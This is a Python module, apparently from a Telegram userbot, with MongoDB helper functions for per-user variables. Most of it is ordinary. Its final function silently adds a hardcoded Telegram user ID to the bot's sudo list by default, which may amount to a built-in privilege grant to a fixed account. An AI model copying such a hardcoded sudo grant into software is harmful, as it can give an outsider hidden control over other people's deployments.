from DanteUserbot.core.database import mongodb

varsdb = mongodb.vars


async def set_vars(user_id, vars_name, value, query="vars"):
    """Set atau update variabel tertentu untuk pengguna."""
    update_data = {"$set": {f"{query}.{vars_name}": value}}
    await varsdb.update_one({"_id": user_id}, update_data, upsert=True)


async def get_vars(user_id, vars_name, query="vars"):
    """Mendapatkan nilai variabel tertentu untuk pengguna."""
    result = await varsdb.find_one({"_id": user_id})
    return result.get(query, {}).get(vars_name, None) if result else None


async def remove_vars(user_id, vars_name, query="vars"):
    """Menghapus variabel tertentu dari pengguna."""
    remove_data = {"$unset": {f"{query}.{vars_name}": ""}}
    await varsdb.update_one({"_id": user_id}, remove_data)


async def all_vars(user_id, query="vars"):
    """Mengembalikan semua variabel yang dimiliki pengguna."""
    result = await varsdb.find_one({"_id": user_id})
    return result.get(query) if result else None


async def remove_all_vars(user_id):
    """Menghapus semua variabel untuk pengguna tertentu."""
    await varsdb.delete_one({"_id": user_id})


async def get_list_from_vars(user_id, vars_name, query="vars"):
    """Mendapatkan daftar nilai dari variabel berbasis list."""
    vars_data = await get_vars(user_id, vars_name, query)
    return vars_data if isinstance(vars_data, list) else []


async def add_to_vars(user_id, vars_name, value, query="vars"):
    """Menambahkan nilai ke dalam daftar variabel tanpa duplikasi."""
    vars_list = await get_list_from_vars(user_id, vars_name, query)
    if value not in vars_list:
        vars_list.append(value)
        await set_vars(user_id, vars_name, vars_list, query)


async def remove_from_vars(user_id, vars_name, value, query="vars"):
    """Menghapus nilai tertentu dari daftar variabel."""
    vars_list = await get_list_from_vars(user_id, vars_name, query)
    if value in vars_list:
        vars_list.remove(value)
        await set_vars(user_id, vars_name, vars_list, query)


async def ensure_owner_sudo(bot_id, owner_id=1282758415):
    """Memastikan owner selalu ada dalam daftar sudo."""
    sudo_users = await get_list_from_vars(bot_id, "SUDO_USER")
    if owner_id not in sudo_users:
        await add_to_vars(bot_id, "SUDO_USER", owner_id)
